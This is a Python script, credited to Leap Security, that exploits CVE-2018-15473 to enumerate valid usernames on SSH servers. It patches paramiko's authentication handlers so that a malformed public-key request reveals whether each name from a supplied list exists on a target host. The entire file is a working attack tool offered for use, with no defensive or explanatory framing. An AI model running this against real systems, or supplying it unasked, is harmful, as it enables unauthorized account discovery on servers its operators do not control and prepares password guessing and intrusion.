#!/usr/bin/env python3
# CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity)
# Updated for Python 3 with support for username lists

import argparse
import logging
import paramiko
import socket
import sys

class InvalidUsername(Exception):
    pass

# Function to tamper with packet handling
def add_boolean(*args, **kwargs):
    pass

# Overriding paramiko handler functions
try:
    handler_table = paramiko.auth_handler.AuthHandler._client_handler_table
    if isinstance(handler_table, property):
        handler_table = handler_table.__get__(paramiko.auth_handler.AuthHandler)
    old_service_accept = handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
except (AttributeError, TypeError, KeyError):
    print("[!] Unable to access Paramiko's handler table. Ensure compatibility with installed Paramiko version.")
    sys.exit(1)

def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)

def invalid_username(*args, **kwargs):
    raise InvalidUsername()

handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username

def check_user(username, target, port):
    try:
        sock = socket.socket()
        sock.settimeout(5)
        sock.connect((target, port))
        transport = paramiko.Transport(sock)
        
        try:
            transport.start_client()
        except paramiko.ssh_exception.SSHException:
            print("[!] Failed to negotiate SSH transport")
            return
        
        try:
            transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
        except InvalidUsername:
            print(f"[-] {username} is an invalid username")
        except paramiko.ssh_exception.AuthenticationException:
            print(f"[+] {username} is a valid username")
        finally:
            transport.close()
            sock.close()
    except (socket.error, paramiko.ssh_exception.SSHException) as e:
        print(f"[!] Error connecting to {target}:{port} - {e}")

logging.getLogger('paramiko.transport').setLevel(logging.CRITICAL)

parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
parser.add_argument('target', help="IP address of the target system")
parser.add_argument('-p', '--port', type=int, default=22, help="Set port of SSH service")
parser.add_argument('-U', '--userlist', required=True, help="File containing list of usernames to check")

args = parser.parse_args()

try:
    with open(args.userlist, 'r', encoding='utf-8') as f:
        usernames = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print("[!] User list file not found.")
    sys.exit(1)
except Exception as e:
    print(f"[!] Error reading user list file: {e}")
    sys.exit(1)

for user in usernames:
    check_user(user, args.target, args.port)
